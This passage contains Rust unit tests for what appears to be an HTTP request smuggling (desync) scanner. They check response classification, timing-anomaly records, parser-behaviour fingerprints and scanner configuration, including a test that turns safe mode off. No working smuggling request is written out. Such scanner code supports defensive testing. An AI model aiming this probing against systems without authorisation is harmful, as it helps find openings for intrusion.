        let error_response = RawHttpResponse {
            status: 400,
            status_text: "Bad Request".to_string(),
            headers: HashMap::new(),
            body: "Bad Request".to_string(),
            raw_response: "HTTP/1.1 400 Bad Request\r\n\r\nBad Request".to_string(),
            http_version: "HTTP/1.1".to_string(),
        };

        assert!(scanner.is_split_error(&error_response));

        let normal_response = RawHttpResponse {
            status: 200,
            status_text: "OK".to_string(),
            headers: HashMap::new(),
            body: "OK".to_string(),
            raw_response: "HTTP/1.1 200 OK\r\n\r\nOK".to_string(),
            http_version: "HTTP/1.1".to_string(),
        };

        assert!(!scanner.is_split_error(&normal_response));

        let connection_close_response = RawHttpResponse {
            status: 200,
            status_text: "OK".to_string(),
            headers: HashMap::from([("connection".to_string(), "close".to_string())]),
            body: "OK".to_string(),
            raw_response: "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\nOK".to_string(),
            http_version: "HTTP/1.1".to_string(),
        };

        assert!(scanner.is_split_error(&connection_close_response));
    }

    #[test]
    fn test_timing_data_structure() {
        let timing_data = TimingData {
            baseline_ms: 100,
            actual_ms: 1500,
            samples: vec![1500, 1600, 1400],
            anomaly_detected: true,
        };

        assert_eq!(timing_data.baseline_ms, 100);
        assert_eq!(timing_data.actual_ms, 1500);
        assert!(timing_data.anomaly_detected);
        assert_eq!(timing_data.samples.len(), 3);
    }

    #[test]
    fn test_parser_behavior_structure() {
        let parser_behavior = ParserBehavior {
            accepts_duplicate_headers: true,
            header_case_sensitivity: false,
            chunk_extension_handling: "ignored".to_string(),
            te_cl_precedence: "te_first".to_string(),
            connection_header_behavior: "honored".to_string(),
        };

        assert!(parser_behavior.accepts_duplicate_headers);
        assert!(!parser_behavior.header_case_sensitivity);
        assert_eq!(parser_behavior.chunk_extension_handling, "ignored");
    }

    #[test]
    fn test_differential_response_structure() {
        let diff_response = DifferentialResponse {
            test_name: "header_case_test".to_string(),
            response_a: "200 OK".to_string(),
            response_b: "400 Bad Request".to_string(),
            difference_detected: true,
            difference_type: "status_code".to_string(),
        };

        assert!(diff_response.difference_detected);
        assert_eq!(diff_response.difference_type, "status_code");
        assert_eq!(diff_response.test_name, "header_case_test");
    }

    #[test]
    fn test_connection_pool_initialization() {
        let pool = ConnectionPool::new(5);
        assert_eq!(pool.max_per_host, 5);
        assert!(pool.connections.is_empty());
    }

    #[test]
    fn test_desync_result_with_enhanced_evidence() {
        let config = DesyncConfig::default();
        let scanner = DesyncScanner::new(config).unwrap();
        let marker = scanner.generate_marker();

        let result = DesyncResult {
            url: "https://example.com".to_string(),
            test_type: DesyncType::TE0,
            severity: DesyncSeverity::High,
            signals: vec![
                DesyncSignal::ResponseContamination {
                    marker: marker.clone(),
                },
                DesyncSignal::TimingAnomaly {
                    delay_ms: 1500,
                    baseline_ms: 200,
                },
            ],
            request_fingerprint: "test_fingerprint".to_string(),
            response_status: 200,
            contamination_marker: Some(marker),
            timing_ms: 1500,
            via_header: Some("1.1 proxy".to_string()),
            alt_svc: None,
            evidence: DesyncEvidence {
                raw_request: "POST / HTTP/1.1\r\n...".to_string(),
                raw_response: "HTTP/1.1 200 OK\r\n...".to_string(),
                connection_reused: true,
                server_header: Some("nginx/1.20".to_string()),
                response_headers: HashMap::new(),
                body_snippet: Some("response body".to_string()),
                timing_data: TimingData {
                    baseline_ms: 200,
                    actual_ms: 1500,
                    samples: vec![1500, 1600, 1400],
                    anomaly_detected: true,
                },
                connection_fingerprint: Some("te0_attack".to_string()),
                parser_behavior: Some(ParserBehavior {
                    accepts_duplicate_headers: true,
                    header_case_sensitivity: false,
                    chunk_extension_handling: "processed".to_string(),
                    te_cl_precedence: "te_first".to_string(),
                    connection_header_behavior: "honored".to_string(),
                }),
                differential_responses: vec![DifferentialResponse {
                    test_name: "case_sensitivity".to_string(),
                    response_a: "200 OK".to_string(),
                    response_b: "400 Bad Request".to_string(),
                    difference_detected: true,
                    difference_type: "status_code".to_string(),
                }],
                cache_indicators: vec!["X-Cache: MISS".to_string()],
            },
        };

        assert_eq!(result.test_type, DesyncType::TE0);
        assert_eq!(result.severity, DesyncSeverity::High);
        assert_eq!(result.signals.len(), 2);
        assert!(result.evidence.timing_data.anomaly_detected);
        assert!(result.evidence.parser_behavior.is_some());
        assert!(!result.evidence.differential_responses.is_empty());
        assert!(!result.evidence.cache_indicators.is_empty());
    }

    #[tokio::test]
    async fn test_enhanced_desync_config_initialization() {
        let config = DesyncConfig {
            safe_mode: false,
            enable_timing_analysis: true,
            enable_advanced_chunking: true,
            enable_h2_downgrade_tests: true,
            enable_cache_probing: true,
            timing_samples: 5,
            timing_threshold_ms: 1000,
            max_connections_per_host: 10,
            ..Default::default()
        };

        let scanner = DesyncScanner::new(config).unwrap();

        assert_eq!(scanner.config.timing_samples, 5);
        assert_eq!(scanner.config.timing_threshold_ms, 1000);
        assert_eq!(scanner.config.max_connections_per_host, 10);
        assert!(scanner.config.enable_advanced_chunking);
        assert!(scanner.config.enable_h2_downgrade_tests);
        assert!(scanner.config.enable_cache_probing);
    }
}
